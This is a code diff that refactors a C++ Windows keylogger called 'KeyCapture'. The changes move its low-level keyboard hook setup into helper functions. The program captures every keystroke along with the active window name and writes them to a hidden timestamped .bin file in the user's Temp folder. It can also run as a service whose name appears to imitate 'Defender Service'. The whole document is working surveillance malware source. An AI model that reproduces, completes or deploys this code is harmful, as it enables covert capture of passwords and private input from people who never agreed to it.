@@ -17,6 +17,7 @@
 // C:\>sc delete "Defender Service"
 
 int SampleServiceMain(int argc, TCHAR *argv[]);
+LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
 
 // KeyBoard hook handle in global scope
 HHOOK KeyboardHook;
@@ -28,14 +29,6 @@ CHAR cWindow[1000];
 HWND lastWindow = NULL;
 // File Path
 std::wstring fileName = L"C:\\test.txt";
-
-// All hooks must be unhooked!
-void unhookKeyboard()
-{
-	UnhookWindowsHookEx(KeyboardHook);
-	exit(0);
-
-}
 
 std::string HookCode(DWORD code, BOOL caps, BOOL shift)
 {
@@ -241,7 +234,7 @@ public:
 
 		return std::string("(") + std::to_string(dwProcId) + ") , " + moduleName;
 	}
-
+	 
 	static bool Test() {
 		GetWindowFileName(GetForegroundWindow());
 
@@ -256,11 +249,56 @@ public:
 		{
 			Debug("Service: Calling SampleServiceMain");
 			SampleServiceMain(0, NULL);
+			return true;
+		}
+
+		return false;
+	}
+
+	static boolean HookKeyboard()
+	{
+		PWSTR pwstrAppData = NULL;
+
+		HRESULT hr = SHGetKnownFolderPath(
+			FOLDERID_LocalAppData/*FOLDERID_AppDataProgramData*/,
+			0,
+			NULL,
+			&pwstrAppData
+		);
+
+		if (hr != S_OK)
+		{
+			My::Debug(std::string("SHGetKnownFolderPath failed with ") + std::to_string(hr));
 			return false;
 		}
 
-		return true;
+		long long timestamp = std::chrono::system_clock::now().time_since_epoch().count() / 1000000;
+		fileName = std::wstring(pwstrAppData) + L"\\Temp\\kl" + std::to_wstring(timestamp) + L".bin";
+
+		if (pwstrAppData) {
+			CoTaskMemFree(pwstrAppData);
+			pwstrAppData = NULL;
+		}
+
+		KeyboardHook = SetWindowsHookEx(
+			WH_KEYBOARD_LL, // low-level keyboard input events
+			HookProcedure, // pointer to the hook procedure
+			GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure 
+			NULL //desktop apps, if this parameter is zero
+		);
+		if (!KeyboardHook) {
+			// Hook returned NULL and failed
+			My::Debug("HookKeyboard: Failed to get handle from SetWindowsHookEx()\n");
+		}
+
+		return KeyboardHook != 0;
 	}
+
+	static void UnhookKeyboard()
+	{
+		UnhookWindowsHookEx(KeyboardHook);
+	}
+
 };
 
 LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
@@ -421,30 +459,6 @@ int WinMain(
 		return 0;
 	}
 
-	PWSTR pwstrAppData = NULL;
-
-	HRESULT hr = SHGetKnownFolderPath(
-		FOLDERID_LocalAppData/*FOLDERID_AppDataProgramData*/,
-		0,
-		NULL,
-		&pwstrAppData
-	);
-
-	if (hr != S_OK)
-	{
-		std::cout << "SHGetKnownFolderPath failed with " << "0x" << std::hex << hr;
-		return hr;
-	}
-
-
-	long long timestamp = std::chrono::system_clock::now().time_since_epoch().count() / 1000000;
-	fileName = std::wstring(pwstrAppData) + L"\\Temp\\kl" + std::to_wstring(timestamp) + L".bin";
-
-	if (pwstrAppData) {
-		CoTaskMemFree(pwstrAppData);
-		pwstrAppData = NULL;
-	}
-
 	std::cout << "[*] Starting KeyCapture" << std::endl;
 	/*
 	HHOOK WINAPI SetWindowsHookEx(
@@ -455,17 +469,7 @@ int WinMain(
 	);
 	*/
 	// Start the hook of the keyboard
-	KeyboardHook = SetWindowsHookEx(
-		WH_KEYBOARD_LL, // low-level keyboard input events
-		HookProcedure, // pointer to the hook procedure
-		GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure 
-		NULL //desktop apps, if this parameter is zero
-		);
-	if (!KeyboardHook){
-		// Hook returned NULL and failed
-		std::cout << "[!] Failed to get handle from SetWindowsHookEx()" << std::endl;
-	}
-	else {
+	if (My::HookKeyboard()){
 		std::cout << "[*] KeyCapture handle ready" << std::endl;
 		// http://www.winprog.org/tutorial/message_loop.html
 		MSG Msg;
@@ -475,7 +479,7 @@ int WinMain(
 			DispatchMessage(&Msg);
 		}
 	}
-	unhookKeyboard();
+	My::UnhookKeyboard();
 	// Exit if failure
     return 0;
 }
